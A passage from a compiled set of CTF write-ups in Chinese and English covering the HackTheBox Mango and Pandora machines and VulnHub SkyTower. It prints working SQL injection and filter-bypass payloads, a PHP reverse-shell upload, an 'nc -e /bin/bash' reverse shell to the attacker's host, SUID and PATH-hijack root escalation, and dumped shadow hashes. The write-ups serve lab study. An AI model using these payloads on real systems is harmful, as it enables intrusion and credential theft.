该脚本对两个用户都使用有效的字符集，并逐个字符地显示他们的密码。

``` bash
Password for admin found: t9KcS3>!0B#2
Password for mango found: h3mXK8RhU~f{]f5H
```

两个用户的密码都被成功地获取了。用户mango的凭证可以用来通过SSH登录。

#### getshell & 提权

``` bash
Connecting to 10.10.10.162:22...
Connection established.
To escape to local shell, press 'Ctrl+Alt+]'.

Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Apr 21 05:18:56 UTC 2020

  System load:  0.08               Processes:            99
  Usage of /:   25.8% of 19.56GB   Users logged in:      0
  Memory usage: 14%                IP address for ens33: 10.10.10.162
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

122 packages can be updated.
18 updates are security updates.


Last login: Mon Sep 30 02:58:45 2019 from 192.168.142.138
/usr/bin/xauth:  file /home/mango/.Xauthority does not exist
mango@mango:~$ id
uid=1000(mango) gid=1000(mango) groups=1000(mango)
mango@mango:~$ whoami
mango
mango@mango:~$ sudo -l
[sudo] password for mango: 
Sorry, user mango may not run sudo on mango.
```

找到user.txt但是用户权限不足

``` bash
mango@mango:/home$ cd admin
mango@mango:/home/admin$ ls
user.txt
mango@mango:/home/admin$ cat user.txt
cat: user.txt: Permission denied
```

切换用户，获取user

``` bash
mango@mango:/home/admin$ su admin
Password: 
$ id
uid=4000000000(admin) gid=1001(admin) groups=1001(admin)
$ whoami
admin
$ ls
user.txt
$ cat user.txt
79bf31c6c6eb38a8567832f7f8b47e92
```

下面就是提权步骤了

搜索SUID文件会发现两个不常见的二进制文件，run-mailcap和jjs。

``` bash
$ find / -perm -4000 2>/dev/null
/bin/fusermount
/bin/mount
/bin/umount
/bin/su
/bin/ping
/snap/core/7713/bin/mount
/snap/core/7713/bin/ping
/snap/core/7713/bin/ping6
/snap/core/7713/bin/su
/snap/core/7713/bin/umount
/snap/core/7713/usr/bin/chfn
/snap/core/7713/usr/bin/chsh
/snap/core/7713/usr/bin/gpasswd
/snap/core/7713/usr/bin/newgrp
/snap/core/7713/usr/bin/passwd
/snap/core/7713/usr/bin/sudo
/snap/core/7713/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/7713/usr/lib/openssh/ssh-keysign
/snap/core/7713/usr/lib/snapd/snap-confine
/snap/core/7713/usr/sbin/pppd
/snap/core/6350/bin/mount
/snap/core/6350/bin/ping
/snap/core/6350/bin/ping6
/snap/core/6350/bin/su
/snap/core/6350/bin/umount
/snap/core/6350/usr/bin/chfn
/snap/core/6350/usr/bin/chsh
/snap/core/6350/usr/bin/gpasswd
/snap/core/6350/usr/bin/newgrp
/snap/core/6350/usr/bin/passwd
/snap/core/6350/usr/bin/sudo
/snap/core/6350/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/6350/usr/lib/openssh/ssh-keysign
/snap/core/6350/usr/lib/snapd/snap-confine
/snap/core/6350/usr/sbin/pppd
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgidmap
/usr/bin/run-mailcap
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/at
/usr/bin/traceroute6.iputils
/usr/bin/pkexec
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
```

参考GTFOBins

 - [run-mailcap](https://gtfobins.github.io/gtfobins/run-mailcap/)
 - [jjs](https://gtfobins.github.io/gtfobins/jjs/)

使用Java的Runtime.Exec()函数生成一个shell。

``` bash
$ jjs
Warning: The jjs tool is planned to be removed from a future JDK release
jjs> Java.type('java.lang.Runtime').getRuntime().exec('cp /bin/sh /tmp/sh').waitFor()
0
jjs> Java.type('java.lang.Runtime').getRuntime().exec('chmod u+s /tmp/sh').waitFor()
0
jjs> 
$ cd /tmp
$ ls
hsperfdata_root     systemd-private-daa6581d1d8b4f4ca498d538b165beb7-apache2.service-TSRSE0
mongodb-27017.sock  systemd-private-daa6581d1d8b4f4ca498d538b165beb7-systemd-resolved.service-VipHFk
sh		    systemd-private-daa6581d1d8b4f4ca498d538b165beb7-systemd-timesyncd.service-1Ap17W
$ ./sh -p
# id
uid=4000000000(admin) gid=1001(admin) euid=0(root) groups=1001(admin)
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
8a8ef79a7a2fbb01ea81688424e9ab15
```

成功的获取了root权限并取得了flag

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb22.jpg)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb23.jpg)


<font color="red">知识点总结：</font>

 - 向php请求参数添加[],使用弱比较绕过身份验证
 - NoSQL注入攻击，$ne注入
 - MongoDB注入
 - 正则匹配fuzz查询用户名以及密码
 - 编写python fuzz脚本根据302，200返回页面判断参数是否存在
 - GTFOBins jjs 使用Java的Runtime.Exec()函数生成一个shell
 - chmod u+s /tmp/sh更改shell权限，并使用-p参数提升为root权限

<font color="red">Game over</font>

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg)

<font color="green">***The end,to be continue...***</font>
<!-- kb:end mango -->

</details>

<a id="case-pandora"></a>

## SNMP 凭据与控制台会话注入

SNMP 输出暴露 SSH 账户，内部 Pandora FMS 的查询缺陷改变会话。原文同时保留自动化和手工路径，以及 PATH 提权证据。

<p class="kb-provenance">来源 pandora · 原记录 2022-01-12 · 12 个代码块 · 9 处图片引用</p>

<details class="kb-evidence" id="record-pandora">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start pandora -->

#### introduce

OS: Linux
Difficulty: Easy
Points:	20
Release:	08 Jan 2022
IP:	10.10.11.136

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2122.jpg)

 - ![my htb rank](http://www.hackthebox.eu/badge/image/235857)



#### Enumeration
#### NMAP

``` bash
┌──(root💀kali)-[~/hackthebox/machine/pandora]
└─# nmap -sV -v -p- --min-rate=10000 10.10.11.136
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We see that the TCP ports 22(ssh) and 80(http) are open. Let's check what the port 80 gives us.

Navigating the website, it seems like all are static pages and no dynamic content is being shown. There is one form for filling sending a message to admins, but the form does not do anything except refresh the page. There is also not a robots.txt that may reveal some juicy info. Maybe there are some interesting hidden directories, let's fire gobuster!

``` bash
┌──(root💀kali)-[~/hackthebox/machine/pandora]
└─# gobuster dir -u http://10.10.11.136 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.136
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/01/12 00:51:23 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 313] [--> http://10.10.11.136/assets/]
```

Gobuster gives nothing interesting except, the /assets directory which contains javascript and css files and some images. Maybe this is the directory where it is fetching the contents on the main website from.

At this point we don't have much to work with. Let's try a UDP scan.

``` bash
nmap -sU -sC -sV -v 10.10.11.136

Discovered open port 161/udp on 10.10.11.136
```

We got one port(UDP 161) SNMP. Let's see what it has to offer. We run snmpwalk with the public community string.

public is default for most snmp servers and thats why I tried public first, if it doesn't work, one might have to bruteforce the community string.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/pandora]
└─# snmpwalk -v 2c 10.10.11.136 -c public | grep daniel
iso.3.6.1.2.1.25.4.2.1.5.817 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"
iso.3.6.1.2.1.25.4.2.1.5.1119 = STRING: "-u daniel -p HotelBabylon23"
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2123.jpg)

Snmpwalk gave us a bunch of details, but the most interesting one is the credentials of the user Daniel. Apparently there is a process running and the command of that includes the credentials for the user Daniel.

Let's ssh into the box with the obtained credentials. The user "daniel" does not have a lot of privileges. Looking at /etc/passwd, there is one other user matt which might have privileges. Looking around the system, we see that along with the static website that we saw earlier, there is one another web app called pandora. But looking at the sites-enabled config, there seems to be no way to it. But making a curl request from the localhost(victim), shows something interesting.

``` bash
daniel@pandora:~$ curl http://localhost
<meta HTTP-EQUIV="REFRESH" content="0; url=/pandora_console/">
```

It seems like only the localhost might have access to that website. Let's create an ssh tunnel to port 80 so that we can view the website from our machine.

``` bash
ssh -L 80:localhost:80 daniel@10.10.11.136
```

The pandora console opens and asks for credentials.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2124.jpg)

Common login credentials like admin/admin, admin/password don't work. Googling pandora gives us the information that it is a monitoring system. Moreover the version of the pandora is clearly visible on the bottom of the login page: v7.0NG.742. On searching for the exploit specific to this version we come across a very interesting article.

 - [Pandora FMS 742: Critical Code Vulnerabilities Explained](https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained)

This article gives a detailed explanation of the underlying vulnerability. Using this sql injection we can bypass the login page and get admin access

#### use the following exp

 - [CVE-2021-32099](https://github.com/zjicmDarkWing/CVE-2021-32099)

just access following url

``` bash
http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=' union SELECT 1,2,'id_usuario|s:5:"admin";' as data -- SgGO
```

then refresh the page, then we are in...

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2125.jpg)

#### or just use sqlmap to get admin's PHPSESSID

``` bash
┌──(root💀kali)-[~/hackthebox/machine/pandora]
└─# sqlmap --url="http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=''" -D pandora -T tsessions_php --dump
......
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: session_id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: session_id=-4214' OR 7546=7546#

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: session_id=''' OR (SELECT 8036 FROM(SELECT COUNT(*),CONCAT(0x716b7a6a71,(SELECT (ELT(8036=8036,1))),0x7176716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- HLHR

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: session_id=''' AND (SELECT 1534 FROM (SELECT(SLEEP(5)))VpEy)-- vAqO
---

Database: pandora
Table: tsessions_php
[49 entries]
+----------------------------+------------------------------------------------------+-------------+
| id_session                 | data                                                 | last_active |
+----------------------------+------------------------------------------------------+-------------+
| 09vao3q1dikuoi1vhcvhcjjbc6 | id_usuario|s:6:"daniel";                             | 1638783555  |
| 0ahul7feb1l9db7ffp8d25sjba | NULL                                                 | 1638789018  |
| 11umescohevmlgeoq1e6clrp4v | id_usuario|s:6:"daniel";                             | 1641955048  |
| 1um23if7s531kqf5da14kf5lvm | NULL                                                 | 1638792211  |
| 2e25c62vc3odbppmg6pjbf9bum | NULL                                                 | 1638786129  |
| 346uqacafar8pipuppubqet7ut | id_usuario|s:6:"daniel";                             | 1638540332  |
| 3me2jjab4atfa5f8106iklh4fc | NULL                                                 | 1638795380  |
| 4f51mju7kcuonuqor3876n8o02 | NULL                                                 | 1638786842  |
| 4nsbidcmgfoh1gilpv8p5hpi2s | id_usuario|s:6:"daniel";                             | 1638535373  |
| 5682e0ou1l66p921j3p93hngea | NULL                                                 | 1641959327  |
| 59qae699l0971h13qmbpqahlls | NULL                                                 | 1638787305  |
| 5bhrjn4ei51vtt33vp18p42sj4 | NULL                                                 | 1641959245  |
| 5fihkihbip2jioll1a8mcsmp6j | NULL                                                 | 1638792685  |
| 5i352tsdh7vlohth30ve4o0air | id_usuario|s:6:"daniel";                             | 1638281946  |
| 69gbnjrc2q42e8aqahb1l2s68n | id_usuario|s:6:"daniel";                             | 1641195617  |
| 6rjav587a3lafqum2oifkvptan | NULL                                                 | 1641959355  |
| 81f3uet7p3esgiq02d4cjj48rc | NULL                                                 | 1623957150  |
| 82k8g5avplsdj83s0mkqkp77l0 | NULL                                                 | 1641959280  |
| 8m2e6h8gmphj79r9pq497vpdre | id_usuario|s:6:"daniel";                             | 1638446321  |
| 8upeameujo9nhki3ps0fu32cgd | NULL                                                 | 1638787267  |
| 9vv4godmdam3vsq8pu78b52em9 | id_usuario|s:6:"daniel";                             | 1638881787  |
| a3a49kc938u7od6e6mlip1ej80 | NULL                                                 | 1638795315  |
| agfdiriggbt86ep71uvm1jbo3f | id_usuario|s:6:"daniel";                             | 1638881664  |
| cojb6rgubs18ipb35b3f6hf0vp | NULL                                                 | 1638787213  |
| d0carbrks2lvmb90ergj7jv6po | NULL                                                 | 1638786277  |
| f0qisbrojp785v1dmm8cu1vkaj | id_usuario|s:6:"daniel";                             | 1641200284  |
| fikt9p6i78no7aofn74rr71m85 | NULL                                                 | 1638786504  |
| fj5973s4hsdkl25lskua24hbsa | NULL                                                 | 1641958908  |
| fqd96rcv4ecuqs409n5qsleufi | NULL                                                 | 1638786762  |
| fvt8eacn87b0um261o6itg0fns | id_usuario|s:5:"admin";alert_msg|a:0:{}new_chat|b:0; | 1641959362  |
| g0kteepqaj1oep6u7msp0u38kv | id_usuario|s:6:"daniel";                             | 1638783230  |
| g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:"matt";alert_msg|a:0:{}new_chat|b:0;  | 1638796349  |
| gf40pukfdinc63nm5lkroidde6 | NULL                                                 | 1638786349  |
| heasjj8c48ikjlvsf1uhonfesv | NULL                                                 | 1638540345  |
| hf67p6grm46nvkc89t9jfu8pvo | id_usuario|s:6:"daniel";                             | 1641959232  |
| hsftvg6j5m3vcmut6ln6ig8b0f | id_usuario|s:6:"daniel";                             | 1638168492  |
| jecd4v8f6mlcgn4634ndfl74rd | id_usuario|s:6:"daniel";                             | 1638456173  |
| k4gk31co9jovifc0h7dpdjjhmd | NULL                                                 | 1641959269  |
| kp90bu1mlclbaenaljem590ik3 | NULL                                                 | 1638787808  |
| ne9rt4pkqqd0aqcrr4dacbmaq3 | NULL                                                 | 1638796348  |
| o3kuq4m5t5mqv01iur63e1di58 | id_usuario|s:6:"daniel";                             | 1638540482  |
| ogmrr1pttk20cm1rjjv5buu6s4 | NULL                                                 | 1641959258  |
| oi2r6rjq9v99qt8q9heu3nulon | id_usuario|s:6:"daniel";                             | 1637667827  |
| pjp312be5p56vke9dnbqmnqeot | id_usuario|s:6:"daniel";                             | 1638168416  |
| qq8gqbdkn8fks0dv1l9qk6j3q8 | NULL                                                 | 1638787723  |
| r097jr6k9s7k166vkvaj17na1u | NULL                                                 | 1638787677  |
| rgku3s5dj4mbr85tiefv53tdoa | id_usuario|s:6:"daniel";                             | 1638889082  |
| u5ktk2bt6ghb7s51lka5qou4r4 | id_usuario|s:6:"daniel";                             | 1638547193  |
| u74bvn6gop4rl21ds325q80j0e | id_usuario|s:6:"daniel";                             | 1638793297  |
+----------------------------+------------------------------------------------------+-------------+
......
```

After logging in as admin, we snoop around a bit and see that there is a file upload options. It also seems like the system is written in php. So lets use the good old php-reverse-shell.

go to admin tools -> file manager

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2126.jpg)

We upload the shell and set a listener at 9000 on our machine and navigate to the shell in our browser.

``` bash
http://localhost/pandora_console/images/php-reverse-shell.php
```

Voila! We get a reverse shell with the user matt and we get user.txt. Great!!!

``` bash
┌──(root💀kali)-[~/hackthebox/machine/pandora]
└─# nc -lvp 1234                                         
listening on [any] 1234 ...
10.10.11.136: inverse host lookup failed: Unknown host
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.136] 49270
Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 13:23:38 up 14 min,  1 user,  load average: 0.00, 0.03, 0.08
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
daniel   pts/0    10.10.14.3       13:09   13:52   0.05s  0.05s -bash
uid=1000(matt) gid=1000(matt) groups=1000(matt)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1000(matt) gid=1000(matt) groups=1000(matt)
$ whoami
matt
$ python -c 'import pty; pty.spawn("/bin/bash")'
/bin/sh: 3: python: not found
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
matt@pandora:/$
matt@pandora:/home/matt$ cat user.txt
48d4ff3d5d47803c2e69216fb3a7cee9
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2129.jpg)

write a ssh key in matt user's home dir

``` bash
┌──(root💀kali)-[~/hackthebox/machine/pandora]
└─# ssh -i id_rsa matt@10.10.11.136                               
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 12 Jan 14:40:31 UTC 2022

  System load:  0.14              Processes:             262
  Usage of /:   63.0% of 4.87GB   Users logged in:       2
  Memory usage: 8%                IPv4 address for eth0: 10.10.11.136
  Swap usage:   0%

  => /boot is using 91.8% of 219MB


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Jan 12 14:39:39 2022 from 10.10.17.32
matt@pandora:~$ id
uid=1000(matt) gid=1000(matt) groups=1000(matt)
matt@pandora:~$ whoami
matt
```

After logging in, the first thing we do is obtain linpeas.sh onto the target system. Running linpeas gives some juicy info, but the most eye catching thing is a binary called pandora_backup with the SUID set.

Looking at the contents of the binary, we see that it is using tar to uncompress something from /root. Since tar is not being called with the absolute path, we can use PATH highjacking to obtain root.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2127.jpg)

We create a local file tar, with contents "/bin/sh", append the path to our PATH env variable and run the binary and we get root and out last flag inside /root

``` bash
matt@pandora:~$ echo "/bin/sh" > tar
matt@pandora:~$ chmod +x tar
matt@pandora:~$ export PATH=$(pwd):$PATH
matt@pandora:~$ /usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
# id
uid=0(root) gid=1000(matt) groups=1000(matt)
# whoami
root
# cat /root/root.txt
956517a857308a1537fd51418aa48805
# cat /etc/shadow
root:$6$HM2preufywiCDqbY$XPrZFWf6w08MKkjghhCPBkxUo2Ag5xvZYOh4iD4XcN4zOVbWsdvqLYbznbUlLFxtC/.Z0oe9D6dT0cR7suhfr.:18794:0:99999:7:::
daemon:*:18659:0:99999:7:::
bin:*:18659:0:99999:7:::
sys:*:18659:0:99999:7:::
sync:*:18659:0:99999:7:::
games:*:18659:0:99999:7:::
man:*:18659:0:99999:7:::
lp:*:18659:0:99999:7:::
mail:*:18659:0:99999:7:::
news:*:18659:0:99999:7:::
uucp:*:18659:0:99999:7:::
proxy:*:18659:0:99999:7:::
www-data:*:18659:0:99999:7:::
backup:*:18659:0:99999:7:::
list:*:18659:0:99999:7:::
irc:*:18659:0:99999:7:::
gnats:*:18659:0:99999:7:::
nobody:*:18659:0:99999:7:::
systemd-network:*:18659:0:99999:7:::
systemd-resolve:*:18659:0:99999:7:::
systemd-timesync:*:18659:0:99999:7:::
messagebus:*:18659:0:99999:7:::
syslog:*:18659:0:99999:7:::
_apt:*:18659:0:99999:7:::
tss:*:18659:0:99999:7:::
uuidd:*:18659:0:99999:7:::
tcpdump:*:18659:0:99999:7:::
landscape:*:18659:0:99999:7:::
pollinate:*:18659:0:99999:7:::
usbmux:*:18789:0:99999:7:::
sshd:*:18789:0:99999:7:::
systemd-coredump:!!:18789::::::
matt:$6$JYpB9KogYA60PG6X$dU7jHpb3MIYYg0evztbE8Xw8dx7ok5/U0PaDT63FgQTwyJFr9DbaLa0WzeZGMFd05hrNCnoP5xTUr7Mkl2gNx1:18794:0:99999:7:::
lxd:!:18789::::::
Debian-snmp:!:18789:0:99999:7:::
mysql:!:18789:0:99999:7:::
daniel:$6$f4POti4xJyVf3/yD$7/efpNYDq.baYycVczUb4b5LlEBNami3//4TbI6lPNK2MaWPrqbdvAhLdMrfHnnZATY59rLgr4DeEZ3U8S41l/:18964:0:99999:7:::
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2128.jpg)


#### Summary of knowledge

 - snmpwalk enum to get daniel's ssh password
 - ssh port forwarding
 - Pandora FMS 742 sql injection(CVE-2021-32099)
 - file upload php-reverse-shell.php to get rev shell
 - PATH highjacking to obtain root

#### Contact me

 - QQ: 1185151867
 - twitter: https://twitter.com/fdlucifer11
 - github: https://github.com/FDlucifer

<font color="blue">I'm lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more...</font>
<!-- kb:end pandora -->

</details>

<a id="case-skytower-1"></a>

## 过滤差异与代理内 SSH

SQL 输入过滤、代理可达性和 SSH 登录后立即退出的行为共同限定入口。原文保留绕过字符串与直接执行命令的分支。

<p class="kb-provenance">来源 SkyTower-1 · 原记录 2020-04-09 · 16 个代码块 · 8 处图片引用</p>

<details class="kb-evidence" id="record-skytower-1">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start SkyTower-1 -->

#### 名称
名称：SkyTower: 1
发布日期：2014年6月26日

#### 下载

SkyTower.zip

 - Download (Mirror): https://download.vulnhub.com/skytower/SkyTower.zip
 - Download (Torrent): https://download.vulnhub.com/skytower/SkyTower.zip.torrent



#### 描述

欢迎来到SkyTower：1

该CTF靶机是由Telspace Systems在ITWeb安全峰会和BSidesCPT（开普敦）上为CTF设计的。目的是测试中级到高级的安全爱好者，使用多方面的方法攻击系统并获得“flag”的能力。

将需要跨系统和应用程序漏洞的各个方面的技能，以及对各种服务以及如何攻击它们的理解。最重要的是，渗透测试的逻辑思维和方法性方法将发挥作用，以使能够成功地攻击此系统。尝试不同的变体和方法。会发现自动化工具无法为提供帮助。

鼓励先自己尝试一下，给自己足够的时间，然后再回到下面的演练中。

请享用！
Telspace Systems
@telspacesystems

#### 信息收集

上nmap

``` bash
root@kali:~/vulnhub/SkyTower# nmap -sn -v 192.168.56.*
Nmap scan report for 192.168.56.101
Host is up (0.00015s latency).
MAC Address: 08:00:27:54:4A:37 (Oracle VirtualBox virtual NIC)
```

``` bash
root@kali:~# nmap -p- -v -sV 192.168.56.101
PORT     STATE    SERVICE    VERSION
22/tcp   filtered ssh
80/tcp   open     http       Apache httpd 2.2.22 ((Debian))
3128/tcp open     http-proxy Squid http proxy 3.1.20
```

``` bash
root@kali:~# nmap -p 22,80,3128 -v -A -T4 --script=vuln 192.168.56.101
PORT     STATE    SERVICE    VERSION
22/tcp   filtered ssh
80/tcp   open     http       Apache httpd 2.2.22 ((Debian))
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.101
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.56.101:80/
|     Form id: 
|_    Form action: login.php
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /login.php: Possible admin folder
|_http-server-header: Apache/2.2.22 (Debian)
| http-sql-injection: 
|   Possible sqli for forms:
|     Form at path: /, form's action: login.php. Fields that might be vulnerable:
|_      email
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
3128/tcp open     http-proxy Squid http proxy 3.1.20
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-server-header: squid/3.1.20
```

在使用nmap进行主动扫描之后，发现了以下服务。ssh，http，http代理。

ssh端口已被过滤，因此只能访问http和代理。从http开始。

在对目标使用nikto和dirb之后，没有发现任何有趣的东西。

访问80端口的网站，并抓包分析

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub246.jpg)

email参数容易受到SQL注入的攻击。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub247.jpg)

但是使用sqlmap等自动化sql注入测试工具无法跑出数据，因为对sql注入语句做了过滤，需要想办法寻找payload绕过

多输入一些不同类型的字符测试发包，正如从响应中看到的那样，

``` bash
SQL会过滤“OR”可以很容易使用“||”绕过
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub248.jpg)

使用以下两个payload都可以绕过对sql注入语句中“or”的过滤

payload1

``` bash
email=' || email LIKE '%';#
```

payload2

``` bash
'oorr 1> 0＃'
```

能够绕过身份验证，并显示以下内容。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub249.jpg)

当用户登录时，会显示明确的用户名和密码，并提示您登录ssh，但端口已过滤。但是，尝试枚举Web应用程序中的所有用户。启动一个Burp intruder实例以暴力破解并枚举Web应用程序中的所有有效电子邮件，用户名和密码。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub250.jpg)

因此，得到了电子邮件，以j开头，另一个以s开头，以w开头。现在，当每封电子邮件登录时，获得了以下数据。

 - Payload used : [email=' || email LIKE 'j%';#]

``` bash
Username: john
Password: hereisjohn
```

 - Payload used : [email=' || email LIKE 'w%';#]

``` bash
Username: william
Password: senseable
```

 - Payload used : [email=' || email LIKE 's%';#]

``` bash
Username: sara
Password: ihatethisjob
```

因此，在获得SSH用户名和密码后，尝试登录并提升权限。

问题在于SSH端口已被过滤。

通过端口扫描，找到了一个代理，并使用代理链通过代理转发连接并访问ssh。

将以下行添加到/etc/proxychains.conf中

``` bash
http 192.168.56.101 3128
```

#### getshell

现在尝试通过命令行连接ssh

``` bash
root@kali:~/vulnhub/SkyTower# proxychains ssh john@127.0.0.1
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-<>-192.168.56.101:3128-<>-127.0.0.1:1080-<--denied
|D-chain|-<>-192.168.56.101:3128-<><>-127.0.0.1:22-<><>-OK
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:QYZqyNNW/Z81N86urjCUIrTBvJ06U9XDDzNv91DYaGc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.
Enter passphrase for key '/root/.ssh/id_rsa': 
john@127.0.0.1's password: 
Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jun 20 07:41:08 2014

Funds have been withdrawn
Connection to 127.0.0.1 closed.
```

无法使用用户william登录。使用sara和john auto登录将关闭连接。尝试在ssh连接时执行命令。

``` bash
root@kali:~/vulnhub/SkyTower# proxychains ssh john@127.0.0.1 nc 192.168.56.102 5566 -e /bin/bash
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-<>-192.168.56.101:3128-<>-127.0.0.1:1080-<--denied
|D-chain|-<>-192.168.56.101:3128-<><>-127.0.0.1:22-<><>-OK
Enter passphrase for key '/root/.ssh/id_rsa': 
john@127.0.0.1's password:
```

kali端使用nc监听端口，得到反弹回来的shell

``` bash
root@kali:~# nc -lvp 5566
listening on [any] 5566 ...
192.168.56.101: inverse host lookup failed: Host name lookup failure
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.101] 34901
id
uid=1000(john) gid=1000(john) groups=1000(john)
whoami
john
pwd
/home/john
```

代表用户john进行枚举后没有发现任何有趣的内容，因此该切换帐户了。无法使用william登录，因此只保留了sara。以sara身份登录后，看起来sara可以使用sudo运行命令。

``` bash
root@kali:~# nc -lvp 5566
listening on [any] 5566 ...
192.168.56.101: inverse host lookup failed: Host name lookup failure
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.101] 34906
id
uid=1001(sara) gid=1001(sara) groups=1001(sara)
whoami
sara
sudo -l
Matching Defaults entries for sara on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sara may run the following commands on this host:
    (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*
```

如所见，sara可以使用sudo运行以下命令cat和ls，目录必须为/accounts/*

找到flag

``` bash
sudo /bin/cat /accounts/../../../root/flag.txt
Congratz, have a cold one to celebrate!
root password is theskytower
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub251.jpg)

然后连接root账户的ssh，成功获取root权限

``` bash
root@kali:~/vulnhub/SkyTower# proxychains ssh root@127.0.0.1 -t "/bin/bash"
ProxyChains-3.1 (http://proxychains.sf.net)
